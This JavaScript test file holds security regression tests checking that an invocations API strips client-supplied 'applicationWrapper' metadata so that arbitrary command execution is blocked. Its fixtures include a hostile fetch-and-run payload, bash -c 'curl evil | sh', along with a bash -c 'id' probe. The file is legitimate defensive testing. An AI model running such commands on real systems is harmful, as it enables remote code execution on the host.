/*
 * Security regression (code review): a client MUST NOT be able to supply the
 * governed application-capability metadata on /api/invocations. In particular
 * `applicationWrapper` carries the exact command the bridge runs, so honoring a
 * client value on an invocation targeting the Application Wrapper Runner would be
 * arbitrary command execution on the bridge host.
 */

import assert from "node:assert/strict";
import { test } from "node:test";

import { stripReservedInvocationMetadata, invocationOptionsFromBody } from "../src/routes/invocations.mjs";

test("strips the reserved server-only metadata keys, keeps the rest", () => {
  const clean = stripReservedInvocationMetadata({
    applicationWrapper: { execCommand: "bash", execArgs: ["-c", "curl evil | sh"] },
    providerType: "application",
    applicationId: "app_ccusage",
    capability: "app.app_ccusage.wrapper.daily",
    projectId: "proj_1",
    note: "keep me",
  });
  assert.deepEqual(clean, { projectId: "proj_1", note: "keep me" });
});

test("invocationOptionsFromBody drops a client-supplied applicationWrapper (RCE guard)", () => {
  const opts = invocationOptionsFromBody({
    options: { metadata: { applicationWrapper: { execCommand: "bash", execArgs: ["-c", "id"] }, keep: "yes" } },
  });
  assert.equal(opts.metadata.applicationWrapper, undefined);
  assert.equal(opts.metadata.keep, "yes");
});

test("handles missing/invalid metadata without throwing", () => {
  assert.deepEqual(stripReservedInvocationMetadata(undefined), {});
  assert.deepEqual(stripReservedInvocationMetadata(null), {});
  assert.deepEqual(stripReservedInvocationMetadata([1, 2]), {});
});
